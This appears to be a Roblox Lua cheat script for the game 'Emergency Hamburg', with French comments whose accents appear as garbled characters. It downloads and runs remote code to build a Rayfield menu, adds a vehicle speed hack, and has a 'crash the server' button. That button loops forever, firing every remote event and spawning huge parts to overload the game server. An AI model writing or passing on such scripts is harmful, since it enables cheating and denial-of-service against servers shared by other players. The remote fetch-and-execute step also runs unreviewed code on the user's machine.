-- üìå Chargement de Rayfield UI
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

if not Rayfield then
    warn("‚ùå Rayfield UI n'a pas pu √™tre charg√© !")
    return
end
print("‚úÖ Rayfield UI charg√© avec succ√®s !")

-- üìå Cr√©ation de la fen√™tre principale
local Window = Rayfield:CreateWindow({
    Name = "Emergency Hamburg",
    LoadingTitle = "Hamburg Script üî• v1.0",
    LoadingSubtitle = "By azfasty",
    Theme = "Default",
    ConfigurationSaving = {Enabled = false}
})

-- üìå Onglet V√©hicule
local VehicleTab = Window:CreateTab("V√©hicule", "car")

-- üîπ Variables
local speedBoostEnabled = false
local boostMultiplier = 2  -- Par d√©faut, double la vitesse
local originalSpeed = {}

-- ‚úÖ Toggle pour activer/d√©sactiver le Speed Boost
VehicleTab:CreateToggle({
    Name = "Activer Speed Boost",
    CurrentValue = false,
    Flag = "SpeedBoost",
    Callback = function(state)
        speedBoostEnabled = state
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character.Parent then
            local vehicle = player.Character.Parent
            if vehicle and vehicle:FindFirstChild("Engine") then
                local engine = vehicle.Engine
                if engine:FindFirstChild("MaxSpeed") then
                    -- Sauvegarde de la vitesse de base
                    if not originalSpeed[vehicle] then
                        originalSpeed[vehicle] = engine.MaxSpeed.Value
                    end
                    
                    if speedBoostEnabled then
                        engine.MaxSpeed.Value = originalSpeed[vehicle] * boostMultiplier
                    else
                        engine.MaxSpeed.Value = originalSpeed[vehicle]
                    end
                end
            end
        end
    end
})

-- ‚úÖ Slider pour r√©gler la puissance du boost
VehicleTab:CreateSlider({
    Name = "Puissance du Boost",
    Range = {1, 5},  -- De x1 √† x5
    Increment = 0.5,
    CurrentValue = boostMultiplier,
    Flag = "BoostMultiplier",
    Callback = function(value)
        boostMultiplier = value
    end
})

-- ‚úÖ Bouton pour remettre la vitesse normale
VehicleTab:CreateButton({
    Name = "R√©initialiser la Vitesse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character.Parent then
            local vehicle = player.Character.Parent
            if vehicle and vehicle:FindFirstChild("Engine") then
                local engine = vehicle.Engine
                if engine:FindFirstChild("MaxSpeed") and originalSpeed[vehicle] then
                    engine.MaxSpeed.Value = originalSpeed[vehicle]
                end
            end
        end
    end
})

-- üìå Onglet Crash Serveur
local CrashTab = Window:CreateTab("Crash", "alert-triangle")

-- ‚úÖ Bouton pour crasher le serveur
CrashTab:CreateButton({
    Name = "‚ö†Ô∏è CRASHER LE SERVEUR",
    Callback = function()
        while true do
            -- 1Ô∏è‚É£ Spam des Remote Events pour surcharger le serveur
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    v:FireServer()
                end
            end
            
            -- 2Ô∏è‚É£ Cr√©ation infinie d'objets pour surcharger la m√©moire
            local obj = Instance.new("Part")
            obj.Parent = game.Workspace
            obj.Size = Vector3.new(1000, 1000, 1000)
            obj.Anchored = true
            
            -- 3Ô∏è‚É£ T√©l√©portation rapide (le serveur ne suit plus)
            local player = game.Players.LocalPlayer
            if player and player.Character then
                player.Character:SetPrimaryPartCFrame(player.Character:GetPrimaryPartCFrame() * CFrame.new(100, 0, 0))
            end
        end
    end
})

print("üî• Speed Boost & Crash Serveur charg√© avec succ√®s !")
